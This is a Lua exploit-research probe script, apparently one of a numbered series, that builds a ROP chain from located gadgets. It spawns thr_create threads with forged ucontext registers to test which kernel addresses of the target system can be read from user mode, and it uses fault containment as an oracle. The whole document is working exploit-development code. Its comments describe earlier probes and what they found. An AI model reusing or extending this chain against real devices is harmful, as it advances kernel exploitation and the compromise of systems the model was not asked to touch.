-- CRASH_CLASS: MODERATE
-- PROBE 1457a: kernel data-load readability, using the thr_create(430) harness that survives faults
--
-- Context:
--   1456a built the same instrument with a thr_new(455) child and the CONTROL WORKED -- the chain
--   loaded a user page and stored 0x41424344 into the marker -- but the first kernel target killed
--   the whole process, so a thr_new child is not a fault container.  .local/1331a.lua is: it ran 512
--   thr_create(430) children whose RIP was a kernel address, every one of them faulted on the fetch,
--   and the parent survived all 512.  So the readability instrument is rebuilt on thr_create.
--
--   Why the question is still open: 1331a's children faulted on the INSTRUCTION FETCH, and bit 2 of
--   the #PF error code means "the access came from CPL3", not "the PTE has U set".  A page that is
--   user-accessible but NX produces the same error word 5 as a supervisor page.  The readable subset
--   of the kernel half has therefore never been measured.
--
--   Instrument, per target:
--       RIP = bare ret  RSP -> [pop rax][target][mov rax,[rax]][pop rdi][marker][mov [rdi],rax]
--                            [pop rdi][0][pop rax][431][syscall stub]
--     load succeeds -> marker holds the first qword of the target
--     load faults   -> child dies alone (1331a's 512), marker keeps its sentinel
--   [A] is a user-page control and must change the marker.
--
-- -- prior art:
--   probes/phase36_realargs/1456a_kernel_readable.lua + results/..._20261109_174438.txt (thr_new
--     child: control OK, first kernel target killed the process)
--   .local/1331a.lua + results/1331a_20261109_094441.txt (thr_create presence sweep, 25/512 present)
--   results/phase17_new_vectors/1199a/1199b/1199c (512 contained faults)
--   results/phase17_new_vectors/384b_child_write_minimal.lua (chain shapes)
--   docs/FAULT_CODE_ORACLE_14_10.md

print("=== PROBE 1457a: KERNEL READABILITY VIA THR_CREATE CHILDREN ===")
print("")

local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(uint64(a)) end) if ok then return to_num(v) end return nil end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(uint64(a)) end) if ok then return v end return nil end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function fmt(v) if v==nil then return "nil" end local h,l=hi_lo(v) return string.format("0x%08X%08X",h,l) end

local stub = syscall.pipe.fn_addr
local pid0 = to_num(mk(20)())
print(string.format("[0] pid=%d", pid0))

local g_pop_rax = gadgets["pop rax; ret"]
local g_pop_rdi = gadgets["pop rdi; ret"]
local g_load    = gadgets["mov rax, [rax]; ret"]
local g_store   = gadgets["mov [rdi], rax; ret"]
local g_ret     = gadgets["ret"]
print(string.format("[0] pop_rax=%s pop_rdi=%s load=%s store=%s ret=%s",
    fmt(g_pop_rax), fmt(g_pop_rdi), fmt(g_load), fmt(g_store), fmt(g_ret)))
if not (g_pop_rax and g_pop_rdi and g_load and g_store and g_ret) then
    print("[!] gadget missing"); print("=== PROBE 1457a COMPLETE ==="); return
end

local function spin(n) local x=0 for i=1,n do x=x+i end return x end
local function mmap(px)
    local ok,a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = ok and to_num(a) or 0
    if v ~= 0 and v < 0x8000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end

local MARK_BLK = memory.alloc(0x20)
local MARK = as_addr(MARK_BLK)
local SENT = 0xCAFEBABE
local CTRL_BLK = memory.alloc(0x20)
local CTRL = as_addr(CTRL_BLK)

-- one 64 KiB block holds both the child stack and the ROP chain
local blk = mmap(0x10000)
if blk <= 0 then print("[!] mmap failed"); print("=== PROBE 1457a COMPLETE ==="); return end
local ss = 0x10000
-- leave 0x400 bytes ABOVE rsp: the chain occupies [rsp, rsp+0x58] and 1457a-v1 died
-- writing rsp+80 past the end of the mapping (rsp was at the very top).
local rsp = blk + ss - 0x400
print(string.format("[0] chain block=0x%X rsp=0x%X mark=0x%X ctrl=0x%X", blk, rsp, MARK, CTRL))

wq(rsp +  0, g_pop_rax)
wq(rsp +  8, 0)                 -- target slot, rewritten per probe
wq(rsp + 16, g_load)
wq(rsp + 24, g_pop_rdi)
wq(rsp + 32, MARK)
wq(rsp + 40, g_store)
wq(rsp + 48, g_pop_rdi)
wq(rsp + 56, 0)
wq(rsp + 64, g_pop_rax)
wq(rsp + 72, 431)
wq(rsp + 80, stub)

-- ucontext gates measured by 156c/156d
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100}
local ctx = memory.alloc(0x500)
local ctxa = as_addr(ctx)
local tb = memory.alloc(8)
local ts = memory.alloc(16)

local function spawn_chain_child()
    for o = 0, 0x4F8, 8 do wq(ctxa + o, 0) end
    wq(ctxa + Ctx.MAGIC, 0x480)
    wq(ctxa + Ctx.TYPE, 0x10000)
    wq(ctxa + Ctx.CS, 0x43)
    wq(ctxa + Ctx.SS, 0x3B)
    wq(ctxa + Ctx.RIP, g_ret)
    wq(ctxa + Ctx.RSP, rsp)
    wq(as_addr(tb), 0)
    local ok, rv = pcall(function() return mk(430)(uint64(ctxa), uint64(as_addr(tb)), uint64(0)) end)
    return ok and to_num(rv) or -999
end

local function sleep_ms(ms)
    wq(as_addr(ts), 0); wq(as_addr(ts) + 8, ms * 1000000)
    pcall(function() mk(240)(uint64(as_addr(ts)), uint64(0)) end)
end

local function probe_one(tag, target, what)
    wq(MARK, uint64(SENT))
    wq(rsp + 8, uint64(target))
    print(string.format("[%s] %s : %s", tag, fmt(target), what))
    local rv = spawn_chain_child()
    sleep_ms(80)
    local raw = rq(MARK)
    local v = to_num(raw)
    print(string.format("[%s] thr_create=%d marker=%s %s", tag, rv, fmt(raw),
        (v == SENT) and "(sentinel: load faulted)" or "(MARKER CHANGED: the load succeeded)"))
    print("")
end

wq(CTRL, uint64(0x41424344))
probe_one("A", CTRL, "user-page control")

local targets = {
    { 0xFFFFFFFFC0000000, "lone stub page, present in every sweep" },
    { 0xFFFFFFFFC1000000, "image start" },
    { 0xFFFFFFFFC2000000, "image +0x1000000" },
    { 0xFFFFFFFFC3000000, "image +0x2000000" },
    { 0xFFFFFFFFC4000000, "image +0x3000000" },
    { 0xFFFFFFFFC5000000, "image +0x4000000" },
    { 0xFFFFFFFFC6C00000, "last present sample" },
    { 0x7FFFFF000000, "present page from the 1452a dump" },
}
for i = 1, #targets do probe_one("B" .. i, targets[i][1], targets[i][2]) end

print(string.format("[C] alive pid=%d (was %d)", to_num(mk(20)()), pid0))
print("")
print("=== PROBE 1457a COMPLETE ===")
